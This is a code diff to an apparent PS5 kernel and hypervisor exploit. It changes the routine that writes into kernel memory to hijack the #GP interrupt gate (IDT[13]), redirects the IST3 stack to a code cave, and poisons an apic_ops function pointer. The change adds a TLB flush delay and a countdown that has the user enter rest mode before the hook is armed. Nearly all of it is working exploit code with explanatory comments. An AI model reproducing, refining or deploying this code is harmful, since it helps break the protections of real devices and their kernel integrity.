@@ -6154,18 +6154,21 @@ static void campaign_flatz_setup(void) {
             }
         }
 
-        /* ── Force TLB flush for cave page ──
+        /* ── Force TLB flush for cave page (all CPUs) ──
          *
          * We cleared NX in the guest PTE, but the TLB may still cache the
          * old entry (NX=1).  We cleared G-bit so a CR3 reload will evict
-         * it.  Sleep briefly to force a context switch → CR3 reload → TLB
-         * flush.  Without this, the handler page appears NX and the #GP
-         * handler instruction fetch causes a nested #PF → crash.
+         * it.  Sleep to force context switches on ALL CPUs → CR3 reloads
+         * → TLB flushes.  100ms is enough for the current CPU but not
+         * necessarily for idle CPUs.  3 seconds ensures all 8 vCPUs have
+         * context-switched multiple times (timer IRQ at 100-1000Hz).
+         * Without this, the handler instruction fetch may hit a stale
+         * NX TLB entry on a different CPU → nested #PF → crash.
          */
-        printf("[*] Flushing TLB (sleep to force context switch)...\n");
+        printf("[*] Flushing TLB on all CPUs (3s sleep for context switches)...\n");
         fflush(stdout);
-        usleep(100000);  /* 100ms — guarantees context switch + CR3 reload */
-        printf("[+] TLB flush complete\n");
+        sleep(3);  /* 3s — ensures all CPUs flush stale NX TLB entries */
+        printf("[+] TLB flush complete (all CPUs)\n");
 
         /* ── Build #GP handler machine code inline (87 bytes) ──
          *
@@ -6437,16 +6440,9 @@ static void campaign_flatz_setup(void) {
                 printf("%02x ", gp_buf[i]);
             printf("\n");
 
-            /* ── ARM Step 1: Patch IDT[13] → KLD gp_handler ──
-             *
-             * Build new IDT gate for vector 13 (#GP):
-             *   handler  = g_kmod_gp_handler (KLD .text, NPT-executable)
-             *   selector = kernel CS (from original IDT[13])
-             *   IST      = 3 (use IST3 stack from TSS — our cave stack)
-             *   DPL      = 0 (kernel only — #GP is hardware-generated)
-             *   type     = 0xE (64-bit interrupt gate, clears IF)
-             *   P        = 1 (present)
-             */
+            /* Pre-build IDT[13] gate → KLD gp_handler.
+             * Arming is deferred until after the countdown so the user
+             * can navigate to rest mode without a premature #GP. */
             uint8_t new_idt13[16];
             memcpy(new_idt13, idt13_orig, 16);  /* start from original */
 
@@ -6464,29 +6460,58 @@ static void campaign_flatz_setup(void) {
             new_idt13[11] = (uint8_t)((ht >> 56) & 0xFF);
             /* [12..15] = reserved (keep zeros from original) */
 
+            uint64_t new_ist3 = cave_kva + 0x100;
+            uint64_t poisoned = (original_xapic & 0x0000FFFFFFFFFFFFULL) |
+                                (0xDEB7ULL << 48);
+
+            /* ── Deferred arming countdown ──
+             *
+             * DO NOT arm immediately!  Pressing the PS button to exit
+             * the plugin menu triggers APIC interrupt handling, which
+             * calls xapic_mode().  If we poison apic_ops[2] now, the
+             * #GP fires before the user reaches rest mode → panic.
+             *
+             * Instead: give the user 25 seconds to navigate to
+             *   Settings → System → Power Saving → Enter Rest Mode
+             * THEN arm IDT[13] + IST3 + poison in tight sequence. */
+
+            printf("\n");
+            printf("[!] =====================================================\n");
+            printf("[!]  NAVIGATE TO REST MODE NOW!\n");
+            printf("[!] =====================================================\n");
+            printf("[!]\n");
+            printf("[!]  Press the PS button to exit this plugin, then go to:\n");
+            printf("[!]    Settings → System → Power Saving → Enter Rest Mode\n");
+            printf("[!]\n");
+            printf("[!]  STAY on the rest mode screen and WAIT.\n");
+            printf("[!]  The poison will arm in 25 seconds.\n");
+            printf("[!]  Once armed, IMMEDIATELY enter rest mode.\n");
+            printf("[!] =====================================================\n\n");
+            fflush(stdout);
+
+            notify("[HV Research] GO NOW: Settings > System > Power Saving > Rest Mode (25s countdown)");
+
+            /* Countdown — user navigates during this window */
+            for (int cd = 25; cd > 0; cd--) {
+                printf("[*] Arming in %d seconds...\n", cd);
+                fflush(stdout);
+                sleep(1);
+            }
+
+            printf("\n[*] ARMING NOW — IDT[13] + IST3 + poison...\n");
+            fflush(stdout);
+
+            /* ARM Step 1: Patch IDT[13] → KLD gp_handler */
             kernel_copyin(new_idt13, idt13_dmap_addr, 16);
             printf("[+] IDT[13] → 0x%016lx (KLD gp_handler, IST=3)\n",
                    (unsigned long)ht);
 
-            /* ── ARM Step 2: Set IST3 → cave stack ──
-             *
-             * IST3 is the stack pointer for IST=3 interrupts.
-             * Point it to cave+0x100 (top of 256-byte stack area).
-             * CPU pushes SS/RSP/RFLAGS/CS/RIP/errcode here on #GP.
-             */
-            uint64_t new_ist3 = cave_kva + 0x100;
+            /* ARM Step 2: Set IST3 → cave stack */
             kernel_copyin(&new_ist3, ist3_dmap, 8);
             printf("[+] TSS IST3 → 0x%016lx (cave stack, 256 bytes)\n",
                    (unsigned long)new_ist3);
 
-            /* ── ARM Step 3: Poison apic_ops[2] ──
-             *
-             * Replace top 16 bits with 0xdeb7 (ps5-kstuff dead pointer).
-             * This makes the address non-canonical → #GP on dereference.
-             * The handler restores the original value on first #GP.
-             */
-            uint64_t poisoned = (original_xapic & 0x0000FFFFFFFFFFFFULL) |
-                                (0xDEB7ULL << 48);
+            /* ARM Step 3: Poison apic_ops[2] — non-canonical → #GP on call */
             kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
             printf("[+] apic_ops[2] POISONED: 0x%016lx → 0x%016lx\n",
                    (unsigned long)original_xapic, (unsigned long)poisoned);
@@ -6511,6 +6536,8 @@ static void campaign_flatz_setup(void) {
             printf("[+]  Orig xapic:   0x%016lx (will be restored by handler)\n",
                    (unsigned long)original_xapic);
             printf("[+]\n");
+            printf("[+]  ENTER REST MODE NOW!\n");
+            printf("[+]\n");
             printf("[+]  Next xapic_mode() call will trigger:\n");
             printf("[+]    1. #GP (non-canonical address 0x%016lx)\n",
                    (unsigned long)poisoned);
@@ -6519,7 +6546,7 @@ static void campaign_flatz_setup(void) {
             printf("[+]    4. iretq re-executes call with valid pointer\n");
             printf("[+]  System should continue normally after one-shot restore.\n");
 
-            notify("[HV Research] Phase 9 ARMED — #GP hook active!");
+            notify("[HV Research] ARMED! Enter rest mode NOW!");
         } else if (cave_npt_executable) {
             /* ── ARM using inline handler in NPT-executable cave ──
              *
@@ -6539,7 +6566,11 @@ static void campaign_flatz_setup(void) {
                    (unsigned long)cave_pa, (unsigned long)kdata_base_pa);
             printf("[*] Ring-0 execution at this PA range is PROVEN.\n\n");
 
-            /* Build IDT[13] gate → inline handler at cave+0x180 */
+            /* Pre-build IDT[13] gate → inline handler at cave+0x180.
+             * We prepare the gate descriptor now but DON'T write it to
+             * the IDT yet — arming is deferred until after the countdown
+             * so the user can navigate to rest mode without triggering
+             * a premature #GP from any xapic_mode() call. */
             uint64_t ht = handler_kva;  /* cave_kva + 0x180 */
             uint8_t new_idt13[16];
             memcpy(new_idt13, idt13_orig, 16);
@@ -6557,22 +6588,63 @@ static void campaign_flatz_setup(void) {
             new_idt13[11] = (uint8_t)((ht >> 56) & 0xFF);
             /* [12..15] = reserved (keep zeros) */
 
-            kernel_copyin(new_idt13, idt13_dmap_addr, 16);
-            printf("[+] IDT[13] → 0x%016lx (inline handler, IST=3)\n",
-                   (unsigned long)ht);
-
-            /* Set IST3 → cave stack (cave+0x100, 256 bytes growing down) */
             uint64_t new_ist3 = cave_kva + 0x100;
-            kernel_copyin(&new_ist3, ist3_dmap, 8);
-            printf("[+] TSS IST3 → 0x%016lx (cave stack, 256 bytes)\n",
-                   (unsigned long)new_ist3);
+            uint64_t poisoned = (original_xapic & 0x0000FFFFFFFFFFFFULL) |
+                                (0xDEB7ULL << 48);
 
             /* Save original IST3 in cave for post-resume diagnostics */
             kernel_copyin(&orig_ist3, cave_dmap + 0x130, 8);
 
-            /* Poison apic_ops[2] — non-canonical address → #GP on call */
-            uint64_t poisoned = (original_xapic & 0x0000FFFFFFFFFFFFULL) |
-                                (0xDEB7ULL << 48);
+            /* ── Deferred arming countdown ──
+             *
+             * DO NOT arm immediately!  Pressing the PS button to exit
+             * the plugin menu triggers APIC interrupt handling, which
+             * calls xapic_mode().  If we poison apic_ops[2] now, the
+             * #GP fires before the user reaches rest mode → panic.
+             *
+             * Instead: give the user 25 seconds to navigate to
+             *   Settings → System → Power Saving → Enter Rest Mode
+             * THEN arm IDT[13] + IST3 + poison in tight sequence.
+             * The 25-second delay also ensures all CPU TLBs have
+             * flushed the stale NX entry for the cave page. */
+
+            printf("\n");
+            printf("[!] =====================================================\n");
+            printf("[!]  NAVIGATE TO REST MODE NOW!\n");
+            printf("[!] =====================================================\n");
+            printf("[!]\n");
+            printf("[!]  Press the PS button to exit this plugin, then go to:\n");
+            printf("[!]    Settings → System → Power Saving → Enter Rest Mode\n");
+            printf("[!]\n");
+            printf("[!]  STAY on the rest mode screen and WAIT.\n");
+            printf("[!]  The poison will arm in 25 seconds.\n");
+            printf("[!]  Once armed, IMMEDIATELY enter rest mode.\n");
+            printf("[!] =====================================================\n\n");
+            fflush(stdout);
+
+            notify("[HV Research] GO NOW: Settings > System > Power Saving > Rest Mode (25s countdown)");
+
+            /* Countdown — user navigates during this window */
+            for (int cd = 25; cd > 0; cd--) {
+                printf("[*] Arming in %d seconds...\n", cd);
+                fflush(stdout);
+                sleep(1);
+            }
+
+            printf("\n[*] ARMING NOW — IDT[13] + IST3 + poison...\n");
+            fflush(stdout);
+
+            /* ARM Step 1: Patch IDT[13] → inline handler */
+            kernel_copyin(new_idt13, idt13_dmap_addr, 16);
+            printf("[+] IDT[13] → 0x%016lx (inline handler, IST=3)\n",
+                   (unsigned long)ht);
+
+            /* ARM Step 2: Set IST3 → cave stack */
+            kernel_copyin(&new_ist3, ist3_dmap, 8);
+            printf("[+] TSS IST3 → 0x%016lx (cave stack, 256 bytes)\n",
+                   (unsigned long)new_ist3);
+
+            /* ARM Step 3: Poison apic_ops[2] — non-canonical → #GP on call */
             kernel_copyin(&poisoned, g_dmap_base + ops_pa + 2 * 8, 8);
             printf("[+] apic_ops[2] POISONED: 0x%016lx → 0x%016lx\n",
                    (unsigned long)original_xapic, (unsigned long)poisoned);
@@ -6598,6 +6670,8 @@ static void campaign_flatz_setup(void) {
             printf("[+]  Orig xapic:   0x%016lx (will be restored by handler)\n",
                    (unsigned long)original_xapic);
             printf("[+]\n");
+            printf("[+]  ENTER REST MODE NOW!\n");
+            printf("[+]\n");
             printf("[+]  Next xapic_mode() call will trigger:\n");
             printf("[+]    1. #GP (non-canonical address 0x%016lx)\n",
                    (unsigned long)poisoned);
@@ -6606,7 +6680,7 @@ static void campaign_flatz_setup(void) {
             printf("[+]    4. iretq re-executes call with valid pointer\n");
             printf("[+]  System should continue normally after one-shot restore.\n");
 
-            notify("[HV Research] Phase 9 ARMED — inline handler in NPT-exec cave!");
+            notify("[HV Research] ARMED! Enter rest mode NOW!");
         }
 
 phase9_not_armed:
